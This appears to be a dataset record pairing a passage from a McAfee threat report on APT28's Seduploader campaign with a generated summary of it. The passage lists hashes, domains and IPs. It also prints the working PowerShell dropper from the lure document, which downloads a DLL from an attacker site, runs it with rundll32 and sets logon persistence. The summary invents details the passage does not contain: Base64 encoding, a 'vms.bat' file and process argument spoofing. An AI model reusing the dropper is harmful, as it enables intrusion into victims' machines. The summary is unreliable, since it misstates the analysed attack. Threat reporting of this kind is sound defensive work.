Seduploader:\nhxxp://netmediaresources[.]com/media/resource/vms.dll\nThe Seduploader sample has the following artifacts:\nFilename: vms.dll\nSha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7\nCompile date: 2017-10-31 20:11:10\nControl server: webviewres[.]net\nThe document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows.\nWe have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28.\nWe identified the control server domain associated with this activity as webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure. This domain was registered on October 25, a few days before the payload and malicious documents were created. The domain was first active on October 29, just days before this version of Seduploader was compiled. The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.\nFurther McAfee research identified the following related sample:\nFilename: secnt.dll\nSha1: ab354807e687993fbeb1b325eb6e4ab38d428a1e\nCompile date: 2017-10-30 23:53:02\nControl server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as above.)\nThe preceding sample most likely belongs to the same campaign. Based on our analysis it uses the same techniques and payload. We can clearly establish that the campaign involving documents using DDE techniques began on October 25.\nThe domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from\nhxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader (ab354807e687993fbeb1b325eb6e4ab38d428a1e).\nThe PowerShell command embedded in this document:\n$W=New-Object System.Net.WebClient;\n$p=($Env:ALLUSERSPROFILE+\"\\mvdrt.dll\");\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$W.DownloadFile(\"http://sendmevideo.org/dh2025e/eh.dll\",$p);\nif (Test-Path $p){\n$rd_p=$Env:SYSTEMROOT+\"\\System32\\rundll32.exe\";\n$p_a=$p+\",#1\u2033;\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n$p_bat=($Env:ALLUSERSPROFILE+\"\\mvdrt.bat\");\n$text='set inst_pck = \"%ALLUSERSPROFILE%\\mvdrt.dll\"'+\"`r`n\"+'if NOT exist %inst_pck % (exit)'+\"`r`n\"+'start rundll32.exe %inst_pck %,#1'\n[io.File]::WriteAllText($p_bat,$text)\nNew-Item -Path 'HKCU:\\Environment' -Force | Out-Null;\nNew-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -Value \"$p_bat\" -PropertyType String -Force | Out-Null;\n}\nThe file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference .\nThe attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.\n\n<[ENDING OF SECTION]>\n\nBig Headline: Conclusion\nAPT28 is a resourceful threat actor that not only capitalizes on recent events to trick potential victims into infections, but can also rapidly incorporate new exploitation techniques to increase its success. Given the publicity the Cy Con U.S campaign received in the press, it is possible APT28 actors moved away from using the VBA script employed in past actions and chose to incorporate the DDE technique to bypass\nnetwork defenses. Finally, the use of recent domestic events and a prominent US military exercise focused on deterring Russian aggression highlight APT28's ability and interest in exploiting geopolitical events for their operations.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\n\nThe report titled \"McAfee_APT28-Office-Malware-Doc-Citing-NYC-TerrorAttack(11-07-2017)\" details the activities of the advanced persistent threat (APT) group APT28, also known as Fancy Bear. The report focuses on a malicious Word document that leverages the Microsoft Office Dynamic Data Exchange (DDE) technique to execute arbitrary code on a victim's system, regardless of whether macros are enabled. This document capitalizes on the recent terrorist attack in New York City to lure victims into opening it.\n\n### Critical Observations\n\n#### Hide Artifacts: Process Argument Spoofing\n\nThe report describes how the malicious document uses DDE to invoke PowerShell commands, which subsequently download and execute additional payloads. One of the PowerShell commands is Base64 encoded and decodes to a script that downloads a DLL file (vms.dll) from a remote server. The script then creates a batch file (vms.bat) that sets up a registry key to ensure the malicious DLL is executed at logon. This technique involves manipulating the process environment block (PEB) to hide the true nature of the executed commands, making it harder for defensive tools to detect the malicious activity.\n\n#### Reconnaissance\n\nThe primary payload delivered by the malicious document is Seduploader, a first-stage reconnaissance implant. Seduploader profiles prospective victims by pulling basic host information from the infected system and sending it back to the attackers. This information helps the attackers determine if the system is of interest for further exploitation. If the system meets their criteria, the installation of more advanced malware, such as X-Agent or Sedreco, typically follows.\n\n### Conclusion\n\nThe techniques described in the report, particularly the use of DDE to execute PowerShell commands and the deployment of Seduploader, demonstrate APT28's sophisticated approach to evading detection and gathering reconnaissance. By hiding the true nature of the executed commands through process argument spoofing, the attackers make it difficult for security tools to identify the malicious activity. The reconnaissance phase, facilitated by Seduploader, allows the attackers to gather valuable information about the victim's system, enabling them to plan and execute further stages of their operation effectively. This combination of techniques highlights APT28's capability to adapt and leverage recent events and new exploitation methods to achieve their goals.",
